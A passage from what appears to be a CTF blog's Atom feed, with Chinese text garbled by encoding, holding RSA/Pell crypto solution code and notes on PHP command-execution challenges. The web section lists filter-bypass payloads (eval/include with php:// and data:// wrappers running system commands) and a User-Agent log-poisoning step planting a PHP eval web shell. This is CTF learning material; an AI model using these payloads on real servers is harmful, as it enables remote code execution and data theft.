title="Oak land"></a>Oak land</h2><h2 id="Cantilever"><a href="#Cantilever" class="headerlink" title="Cantilever"></a>Cantilever</h2><h2 id="Side-step"><a href="#Side-step" class="headerlink" title="Side step"></a>Side step</h2><h2 id="Faonsa"><a href="#Faonsa" class="headerlink" title="Faonsa"></a>Faonsa</h2><h2 id="Resign"><a href="#Resign" class="headerlink" title="Resign"></a>Resign</h2><h2 id="DBB"><a href="#DBB" class="headerlink" title="DBB"></a>DBB</h2><h2 id="Fiercest"><a href="#Fiercest" class="headerlink" title="Fiercest"></a>Fiercest</h2><h2 id="Mino"><a href="#Mino" class="headerlink" title="Mino"></a>Mino</h2><h2 id="Starter-ECC"><a href="#Starter-ECC" class="headerlink" title="Starter ECC"></a>Starter ECC</h2><h1 id="MEDIUM-HARD"><a href="#MEDIUM-HARD" class="headerlink" title="MEDIUM-HARD"></a>MEDIUM-HARD</h1><h2 id="Watery-soup"><a href="#Watery-soup" class="headerlink" title="Watery soup"></a>Watery soup</h2><h2 id="313-Loyal"><a href="#313-Loyal" class="headerlink" title="313 Loyal"></a>313 Loyal</h2><h2 id="Soda"><a href="#Soda" class="headerlink" title="Soda"></a>Soda</h2><h2 id="Sparse"><a href="#Sparse" class="headerlink" title="Sparse"></a>Sparse</h2><h2 id="Larisa"><a href="#Larisa" class="headerlink" title="Larisa"></a>Larisa</h2><h2 id="Shaim"><a href="#Shaim" class="headerlink" title="Shaim"></a>Shaim</h2><h2 id="Lagima"><a href="#Lagima" class="headerlink" title="Lagima"></a>Lagima</h2><h2 id="Versace"><a href="#Versace" class="headerlink" title="Versace"></a>Versace</h2><h1 id="HARD"><a href="#HARD" class="headerlink" title="HARD"></a>HARD</h1><h2 id="Persian-cat"><a href="#Persian-cat" class="headerlink" title="Persian cat"></a>Persian cat</h2><h2 id="NLCS"><a href="#NLCS" class="headerlink" title="NLCS"></a>NLCS</h2><h2 id="GSDP"><a href="#GSDP" class="headerlink" title="GSDP"></a>GSDP</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¤ç›˜å’¯&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA, math" scheme="http://sh1k4ku.github.io/tags/RSA-math/"/>
    
  </entry>
  
  <entry>
    <title>DSCTF</title>
    <link href="http://sh1k4ku.github.io/2022/07/17/2022/DSCTF/"/>
    <id>http://sh1k4ku.github.io/2022/07/17/2022/DSCTF/</id>
    <published>2022-07-17T03:01:56.000Z</published>
    <updated>2022-07-17T08:54:20.612Z</updated>
    
    <content type="html"><![CDATA[<p>ä¿ºæ‹‰äº†</p><span id="more"></span><h1 id="picproblem"><a href="#picproblem" class="headerlink" title="picproblem"></a>picproblem</h1><p>å¥—å¨ƒï¼Œpell + é€†å›¾ç‰‡+å·²çŸ¥dp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array, zeros, uint8</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="comment"># n =  85413323752199019806030766630760449394238054889872415531186815348349883843039718091361611175963675771467536496812507338620957273406076058263122453235926619595761737396698699834116678598534261542535530241537247151318756003375573850725841254167462648747492270335084402716816450008370008491069875351593380154253</span></span><br><span class="line"><span class="comment"># dp =  1576424214336939000475035870826282526256046059505538052583882122452307602095912733650442447289122473348318614749578285418144935611098423641334952097553125</span></span><br><span class="line"><span class="comment"># c =  53653254613997095145108444611576166902006080900281661447007750088487109015427510365774527924664116641019490904245926171500894236952984157500461367769566121581870986304353174732328118576440353500038670030097108081972287049673200783198844842527470746431369314585103203118824985764754487936404004696485346196488</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for x in range(1, e):</span></span><br><span class="line"><span class="comment"># if(e*dp%x==1):</span></span><br><span class="line"><span class="comment"># p=(e*dp-1)//x+1</span></span><br><span class="line"><span class="comment"># if(n%p!=0):</span></span><br><span class="line"><span class="comment"># continue</span></span><br><span class="line"><span class="comment"># q=n//p</span></span><br><span class="line"><span class="comment"># phin=(p-1)*(q-1)</span></span><br><span class="line"><span class="comment"># d = gp.invert(e, phin)</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(pow(c, d, n)))</span></span><br><span class="line"><span class="comment"># m = b&#x27;*********** kn = 8 **************&#x27;</span></span><br><span class="line">image = cv2.imread(<span class="string">&quot;flag.jpg&quot;</span>)</span><br><span class="line">img_gray = cv2.cvtColor(image,cv2.COLOR_RGB2GRAY)</span><br><span class="line">imagearray = array(img_gray)</span><br><span class="line">h = <span class="built_in">len</span>(imagearray)</span><br><span class="line">w = <span class="built_in">len</span>(imagearray[<span class="number">0</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_pell</span>(<span class="params">N, numTry = <span class="number">1000</span></span>):</span></span><br><span class="line">    cf= continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span>-N*denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer,denom</span><br><span class="line">x, y = solve_pell(<span class="number">903751</span>, <span class="number">2000</span>)</span><br><span class="line">kn = <span class="number">8</span></span><br><span class="line">x = <span class="number">1524993807674193841904821512553946379967374698278296055158206699585083472817489721493862711615915407326315660670541801753616900039772802728925226091475860689682871555641241500183892397513037971186709123629077584204226084524811673794984687840178772052545441242927492902583547355565525538664836516589721942980577095421561886873928634330640979800040574060218872787212426630202508118484269553983399179155489583316400107655564222453437462724749097265122300644936717434151331633092585140183510349369422527440264746843972834927860065578557836150798690530172694679514231722613822246810010130005324032492360889531553803832398604563088256410481865243771216990603166993198935358471831328395618477974126824762560872337594997394218234427050399655270848385995088586420526886397320949350980406936200217112040971433660322179072288438842964957568719036794320203116263329623589339367497303140938070334557345834226085189140858264388063745189833584962825509843279678826240558480527560</span></span><br><span class="line">y = <span class="number">1604145232044543633656616254647708451166351104281510395737885491696385806407267633308545985473789119651681711082023113933085624628557168423578747544761597312012713558891523798820667618256495398479378172124019360339427592449217208805888502769358288779859969965560832505104388955091637704481336716722418336373334467787371085728212260231330510705797124224353810509272250940285165605853594811893804251478850270703294638335268305881655491870226553141286503109543313414279220480589704210363277523457948607498351377843904335637032510420141505975997452077477296326035048463179997347136990808017374750824810458605412236391952910679246288287664717533857743462935708681309073915761377477454479206054016260422865457862565353002789887917196437750618212918420129464330488021272187952177063175896447842395209693304502304253471733746765257510395226972224876277717457205220726240042035259947453816668460757995771018155703600926745905595162857982860955545877343914746294034180707</span></span><br><span class="line"><span class="keyword">assert</span> <span class="number">1301149798051259562945444365741194129602596348352064372203373</span>*<span class="built_in">pow</span>(x, <span class="number">2</span>) == <span class="number">1175915431138623881271508290982969935822476052419526528443170552123</span>*<span class="built_in">pow</span>(y, <span class="number">2</span>) + <span class="number">1301149798051259562945444365741194129602596348352064372203373</span></span><br><span class="line">x1 = <span class="built_in">round</span>(x/y*<span class="number">0.001</span>, <span class="number">16</span>)</span><br><span class="line">u1 = y*<span class="number">3650</span>/x</span><br><span class="line">x2 = <span class="built_in">round</span>(x/y*<span class="number">0.00101</span>, <span class="number">16</span>)</span><br><span class="line">u2 = y*<span class="number">3675</span>/x</span><br><span class="line">x3 = <span class="built_in">round</span>(x/y*<span class="number">0.00102</span>, <span class="number">16</span>)</span><br><span class="line">u3 = y*<span class="number">3680</span>/x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line"><span class="built_in">print</span>(kt)</span><br><span class="line"><span class="built_in">print</span>(h, w)</span><br><span class="line"></span><br><span class="line">temp_image = zeros(shape=[h, w, <span class="number">3</span>], dtype=uint8)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp_image))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp_image[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp_image[<span class="number">0</span>][<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, kn):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, w):</span><br><span class="line">            x1 = u1 * x1 * (<span class="number">1</span> - x1)</span><br><span class="line">            x2 = u2 * x2 * (<span class="number">1</span> - x2)</span><br><span class="line">            x3 = u3 * x3 * (<span class="number">1</span> - x3)</span><br><span class="line">            r1 = <span class="built_in">int</span>(x1 * <span class="number">255</span>)</span><br><span class="line">            r2 = <span class="built_in">int</span>(x2 * <span class="number">255</span>)</span><br><span class="line">            r3 = <span class="built_in">int</span>(x3 * <span class="number">255</span>)</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">                temp_image[i][j][t] = (((r1 + r2) ^ r3) - imagearray[i][j]) % <span class="number">256</span></span><br><span class="line">    x1 = kt[<span class="number">0</span>]</span><br><span class="line">    x2 = kt[<span class="number">1</span>]</span><br><span class="line">    x3 = kt[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br></pre></td></tr></table></figure><h1 id="RSA330"><a href="#RSA330" class="headerlink" title="RSA330"></a>RSA330</h1><p><a href="https://eprint.iacr.org/2022/271.pdf#:~:text=The point of approximate divisor multiples is that,we rely on a standard Coppersmith- type heuristic.">paperé“¾æ¥</a></p><p>å“æœ¬æ¥èƒ½åšå‡ºæ¥çš„ï¼Œæœ€åä¸€ç›´copperä¸å‡ºæ¥ï¼Œä¹Ÿç®—ç£ä¿ƒè‡ªå·±äº†T-T</p><p>é¢˜ç›®åˆ†ä¸‰æ­¥ï¼Œfactor-ç”¨paperçš„æ–¹æ³•æ±‚kl-copper</p><p>ç¬¬äºŒæ­¥å’Œç¬¬ä¸‰æ­¥ä¸ä¸€å®šæœ‰è§£</p><p>copperæœ€åå¾—åˆ°çš„å°èŒƒå¼å•é¡¹å¼ç”¨åŸºæœ¬æ–¹æ³•ã€groebneréƒ½å¯ä»¥å‡ºè§£</p><h1 id="approximate"><a href="#approximate" class="headerlink" title="approximate"></a>approximate</h1><p>RSA copperäº†ä¸€å¤©ï¼Œè¿™é¢˜éƒ½æ²¡çœ‹ã€‚ã€‚å¤ç›˜çš„æ—¶å€™å‘ç°ä¸æ˜¯å¾ˆéš¾</p><script type="math/tex; mode=display">x_1 = p * pp\\x_2 = q * qq\\n = (p+x)*(q+y)\\\because xã€y\; is\;small\\\therefore x_1x_2/n + x \approx pp*qq \;|\;x_1x_2</script><p>ä¸è¿‡xçš„ç•Œè¦è‡ªå·±æ‰¾</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¿ºæ‹‰äº†&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="coppersmith" scheme="http://sh1k4ku.github.io/tags/coppersmith/"/>
    
    <category term="Pell Equation" scheme="http://sh1k4ku.github.io/tags/Pell-Equation/"/>
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>web</title>
    <link href="http://sh1k4ku.github.io/2022/07/11/2022/web/"/>
    <id>http://sh1k4ku.github.io/2022/07/11/2022/web/</id>
    <published>2022-07-11T02:11:09.000Z</published>
    <updated>2022-07-18T10:08:18.016Z</updated>
    
    <content type="html"><![CDATA[<p>å­¦ç‚¹web</p><span id="more"></span><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p><a href="https://blog.csdn.net/zmx2473162621/article/details/115284712">wp</a></p><p><a href="https://wkr.moe/ctf/447.html#web15%5B%E7%A4%BE%E5%B7%A5%5D">wp2</a></p><p><a href="https://blog.csdn.net/a597934448/article/details/105431367">å„ç§æ³„éœ²</a></p><h1 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h1><p><a href="https://blog.csdn.net/solitudi/article/details/109837640">y4çš„wp</a></p><p>ä¸€äº›åŸºæœ¬æå–æ–‡ä»¶çš„æ“ä½œï¼šcatã€nlã€tacã€highlight_file()ã€vimã€vi</p><p>åŒ¹é…ï¼š*å¤šä¸ªå­—ç¬¦åŒ¹é…ï¼Œ?å•ä¸ªå­—ç¬¦åŒ¹é…</p><p>è½¬ä¹‰ç¬¦ï¼š^ã€â€â€ã€â€™â€™</p><p>æ‰§è¡Œå‡½æ•°echo()ã€system()ã€passthru() ã€exec()ã€ shell_exec()ã€popen()ã€proc_open()ã€pcntl_exec()</p><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>åªè¿‡æ»¤äº†flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=system(<span class="string">&quot;nl fla*&quot;</span>);<span class="comment">//åŒ¹é…</span></span><br><span class="line">c=<span class="keyword">echo</span> `nl fl<span class="string">&#x27;&#x27;</span>ag.php`;<span class="comment">//è½¬ä¹‰å­—ç¬¦</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=system(<span class="string">&#x27;nl flag.php&#x27;</span>);<span class="comment">//å› ä¸ºåªè¿‡æ»¤cçš„flagï¼Œæ‰€ä»¥ç”¨1ä¼ å‚ä¸ä¼šè¢«è¿‡æ»¤</span></span><br></pre></td></tr></table></figure><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>è¿‡æ»¤äº†flagã€systemã€php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">&#x27;nl fla?????&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å’Œä¸Šä¸€é—®å·®ä¸å¤š</p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>è¿‡æ»¤äº†å¾ˆå¤šï¼Œâ€/flag|system|php|cat|sort|shell|.| |\â€™/iâ€ï¼ˆ/iå¤§å°å†™ä¸æ•æ„Ÿï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=system(<span class="string">&#x27;nl flag.php&#x27;</span>);<span class="comment">//æ²¡è¿‡æ»¤evalï¼Œç”¨1ä¼ å‚</span></span><br><span class="line">c=<span class="keyword">echo</span>(`nl%<span class="number">09</span>fl[abc]*`);<span class="comment">//%09ç©ºæ ¼è½¬ä¹‰ï¼Œ[abc]åŒ¹é…ä¸åŒ…å«abcçš„æ–‡å­—</span></span><br><span class="line">c=<span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;nl%09fl[a]*&quot;</span>);<span class="comment">//ç­‰ä»·äºsystem()</span></span><br><span class="line">c=<span class="keyword">echo</span>`strings\<span class="variable">$IFS</span>\$<span class="number">9</span>f*`<span class="comment">//\$IFS\$9 winä¸‹ç©ºæ ¼è½¬ä¹‰</span></span><br></pre></td></tr></table></figure><p>æŸ¥æ–‡ä»¶è·¯å¾„çš„è¯­æ³•ï¼š</p><p>é¦–å…ˆ<code>print_r(scandir(dirname(__FILE__)));</code>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶</p><p>ç„¶åæ‰¾åˆ°flag.php<br><code>print_r(next(array_reverse(scandir(dirname(__FILE__)))));</code><br>ä¹‹åé«˜äº®æ˜¾ç¤ºå³å¯<br><code>c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</code></p><p><code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code>å’Œä¸Šé¢çš„å·®ä¸å¤š</p><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>è¿‡æ»¤çš„æ›´å¤šäº†ï¼š(â€œ/flag|system|php|cat|sort|shell|.| |\â€™|`|echo|\;|(/iâ€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$nice</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]<span class="meta">?&gt;</span>&amp;url=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php//è¿™ä¸ª$nice=æš‚ä¸”ä¸çŸ¥é“æ˜¯å¹²å•¥çš„ï¼Œå»æ‰ä¹Ÿèƒ½æ‰§è¡Œ</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&quot;cat flag.php&quot;);<span class="meta">?&gt;</span> //ä¼ªåè®®ï¼Œä¸‹ä¸€ä¸ªä¹Ÿæ˜¯</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/wjrblogs/p/12285202.html">ä¼ªåè®®</a></p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>æ¯”32å¤šè¿‡æ»¤äº†ä¸ªåŒå¼•å·ï¼Œæ‰€ä»¥è¦æŠŠâ€œurlâ€æ”¹æˆ1ï¼šâ€/flag|system|php|cat|sort|shell|.| |\â€™|`|echo|\;|(|\â€/iâ€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl flag.php&quot;);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>å¤šäº†ä¸ªâ€™:â€™ï¼šâ€/flag|system|php|cat|sort|shell|.| |\â€™|`|echo|\;|(|\:|\â€/iâ€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl flag.php&quot;);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>å¤šäº†å°äºå’Œç­‰äºï¼šâ€/flag|system|php|cat|sort|shell|.| |\â€™|`|echo|\;|(|\:|\â€|\&lt;|\=/iâ€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl flag.php&quot;);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>å¤šäº†æ•°å­—ï¼šâ€/flag|system|php|cat|sort|shell|.| |\â€™|`|echo|\;|(|\:|\â€|\&lt;|\=|\/|[0-9]/iâ€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl flag.php&quot;);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>å˜æˆäº†æ–‡ä»¶åŒ…å«</p><p><img src="../images/web/image-20220718144945562.png" alt="image-20220718144945562"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">c=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl fla*&quot;);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">//è¿˜å¯ä»¥é…åˆUAå¤´æ‰§è¡Œæ—¥å¿—åŒ…å«</span></span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>UAå¤´å†™é©¬æ‰§è¡Œæ—¥å¿—æ“ä½œï¼š</p><ol><li><p>å…ˆç”¨c=/var/log/nginx/access.logå‘ç°èƒ½çœ‹æ—¥å¿—<img src="../images/web/image-20220718161423024.png" alt="image-20220718161423024"></p></li><li><p>User-Agentå¤´å†™é©¬ï¼š</p><p><img src="../images/web/image-20220718161940874.png" alt="image-20220718161940874"></p><p>User-Agent: &lt;?php eval($_POST[1]);?&gt;</p></li><li><p>å†çœ‹æ—¥å¿—<img src="../images/web/image-20220718162107763.png" alt="image-20220718162107763"></p></li><li><p>ç„¶åå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ï¼š</p><p><img src="../images/web/image-20220718162135410.png" alt="image-20220718162135410"></p></li><li><p>1=system(â€œnl flag.phpâ€);</p><p><img src="../images/web/image-20220718162225485.png" alt="image-20220718162225485"></p></li></ol><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>â€œ/flag|php|file/iâ€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">c=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl fla*&quot;);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">//è¿˜å¯ä»¥é…åˆUAå¤´æ‰§è¡Œæ—¥å¿—åŒ…å«</span></span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>å’Œä¸Šä¸€é¢˜å·®ä¸å¤š</p><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p><img src="../images/web/image-20220718165432040.png" alt="image-20220718165432040"></p><p>ç”¨<code>c=data://text/plain,&lt;?=phpinfo();?&gt;</code>æµ‹è¯•åç¼€æœ‰æ— å½±å“ï¼Œå‘ç°æ— ï¼š</p><p><img src="../images/web/image-20220718170657074.png" alt="image-20220718170657074"></p><p> .php å› ä¸ºå‰é¢çš„phpè¯­å¥å·²ç»é—­åˆäº†ï¼Œæ‰€ä»¥åé¢çš„.phpä¼šè¢«å½“æˆhtmlé¡µé¢ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œèµ·ä¸åˆ°ä»€ä¹ˆä½œç”¨ã€‚dataåè®®åæœ‰ä¸ª?&gt;,å·²ç»é—­åˆå‰é¢çš„phpä»£ç ï¼Œæ‰€ä»¥åé¢çš„phpæ‹¼æ¥ï¼Œä¸ä¼šå½±å“phpä»£ç çš„æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin,<span class="meta">&lt;?php</span> system(&quot;nl fla*&quot;);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>â€œ/[0-9]|~|`|\@|#|\$|\%|\^|\&amp;|*|\ï¼ˆ|\ï¼‰|-|\=|+|{|[|]|}|\:|\â€™|\â€|\,|\&lt;|.|>|\/|\?|\\/iâ€</p><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;å­¦ç‚¹web&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="http://sh1k4ku.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>åšé¢˜è®°å½•</title>
    <link href="http://sh1k4ku.github.io/2022/07/09/2022/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://sh1k4ku.github.io/2022/07/09/2022/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2022-07-09T08:46:05.000Z</published>
    <updated>2022-07-12T09:13:17.392Z</updated>
    
